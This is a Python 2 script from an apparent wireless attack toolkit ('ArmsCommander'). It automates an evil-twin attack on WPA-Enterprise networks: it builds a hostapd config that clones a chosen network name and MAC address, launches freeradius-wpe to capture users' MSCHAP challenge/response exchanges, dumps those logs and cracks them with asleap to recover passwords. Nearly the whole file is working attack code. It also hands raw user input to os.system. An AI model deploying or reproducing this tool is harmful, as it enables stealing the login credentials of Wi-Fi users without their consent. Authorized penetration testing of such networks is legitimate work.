#!/usr/bin/env python
# coding=UTF-8

import os
import sys
import operator
import socket
import toolkits
import time

os.chdir("/root/ArmsCommander/logs/MGT_ENT_cracker/")


def crack_challenge_response():
    #asleap -C <challenge> -R <response> -W <dictionary>

    challenge_str = str(raw_input(toolkits.yellow("Enter the CHALLENGE STRING found in the logfile: ")))
    response_str = str(raw_input(toolkits.yellow("Enter the RESPONSE STRING: ")))
    dictionary_file = str(raw_input(toolkits.yellow("Enter the location of your DICTIONARY FILE: ")))
    cmd_str = "asleap -C {0} -R {1} -W {2}".format(
        str(challenge_str),
        str(response_str),
        str(dictionary_file)
    )
    os.system(cmd_str)
    return
# We should design it where it writes its own HOSTAPD files

def write_hostapd_conf():
    os.chdir("/root/ArmsCommander/logs/MGT_ENT_cracker/")
    essid_str = str(raw_input(toolkits.yellow("Enter the ESSID ('name') you want the AP to be called: ")))
    bssid_str = str(raw_input(toolkits.yellow("Enter the BSSID MAC address you want to be called: ")))
    channel_str = str(raw_input(toolkits.yellow("Enter what channel you want to use on: ")))
    w = open("hostapd.conf","w")
    hostapd_conf_contents = """
interface=wlan0
driver=nl80211
ssid={0}
bssid={1}
logger_stdout_level=0
ieee8021x=1
eapol_key_index_workaround=0
own_ip_addr=127.0.0.1
auth_server_addr=127.0.0.1
auth_server_port=1812
auth_server_shared_secret=testing123
wpa=2
wpa_key_mgmt=WPA-EAP
channel={2}
wpa_pairwise=TKIP CCMP""".format(
        str(essid_str),
        str(bssid_str),
        str(channel_str)
    )
    w.write(hostapd_conf_contents)
    w.close()
    print toolkits.green("Your new hostapd conf file is completed")
    return
def start_radius_server():
    os.chdir("/root/ArmsCommander/logs/MGT_ENT_cracker/")
# root@Cylon-Raider:~# ifconfig wlan0 down
# root@Cylon-Raider:~# ifconfig wlan0 up
# root@Cylon-Raider:~# service network-manager stop
    os.system('airmon-ng check kill')
    os.system('nmcli nm wifi off')
    os.system('nmcli radio wifi off')
    os.system('rfkill list all')
    os.system('rfkill unblock wlan')
    os.system('ifconfig wlan0 down')
    os.system('ifconfig wlan1 down')
    os.system('service network-manager stop')
    os.system('service freeradius-wpe stop')
    os.system('ifconfig wlan0 up')
    os.system('ifconfig wlan1 up')
    # os.system('rfkill unblock all')
    os.system('rfkill list all')
    print toolkits.yellow("Waiting 3 seconds")
    time.sleep(3)
    os.system("gnome-terminal -e 'bash -c \"freeradius-wpe -X; exec bash\"'")
    # os.system("hostapd ./hostapd.conf")
    os.system("gnome-terminal -e 'bash -c \"hostapd ./hostapd.conf; exec bash\"'")
    os.system("gnome-terminal -e 'bash -c \"Cylon_Raider_Main.py; exec bash\"'")
    return

def dump_challenge_response():
    timestr = toolkits.get_time_string()
    os.chdir("/root/Documents")
    cmd_str = "cat /var/log/freeradius-server-wpe*.log >> /root/ArmsCommander/logs/MGT_ENT_cracker/freeradius-wpe-challenge-response-log-{0}.log".format(
        str(timestr)
    )
    os.system(cmd_str)
    cmd_str = "cat /root/ArmsCommander/logs/MGT_ENT_cracker/freeradius-wpe-challenge-response-log-{0}.log".format(
        str(timestr)
    )
    os.system(cmd_str)
    return

def setup_freeradius():
    cmd_str = "sudo apt-get update && apt-get install freeradius freeradius-wpe hostapd wicd asleap -y"
    os.system(cmd_str)
    return
def main():
    print """
    \t#1. Start the FreeRADIUS server, the HostAPD access point, and Cylon-Raider
    \t#2. EDIT the temporary hostapd configuration file
    \t#3. DUMP logs for FreeRADIUS Wireless Pawn Edition
    \t#4. CRACK the challenge response strings to find the password


    ### Alternative Commands ###

    # 666. SETUP - Install the required components to conduct this attack
    """

    opt_choice = int(raw_input(toolkits.yellow("Enter a OPTION: ")))

    if opt_choice == 1:
        start_radius_server()
        main()
    elif opt_choice == 2:
        write_hostapd_conf()
        main()
    elif opt_choice == 3:
        dump_challenge_response()
        main()
    elif opt_choice == 4:
        crack_challenge_response()
        main()
    elif opt_choice == 666:
        setup_freeradius()
        main()
    else:
        print toolkits.red("You have entered a invalid option")
        main()
    return
main()
